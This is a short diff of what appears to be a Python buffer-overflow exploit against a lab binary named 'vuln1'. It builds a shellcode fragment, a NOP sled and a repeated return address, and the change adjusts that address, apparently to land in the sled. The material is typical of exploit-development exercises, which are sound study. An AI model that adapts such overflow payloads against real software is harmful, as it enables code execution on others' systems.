@@ -11,6 +11,6 @@ buf += "\x60\x6f\xbd\xf8\x07"
 
 buf += "\x90"*48
 
-buf += "\x10\xf1\xff\xbf"*25
+buf += "\x30\xf1\xff\xbf"*25
 
 subprocess.call(['./vuln1', buf])
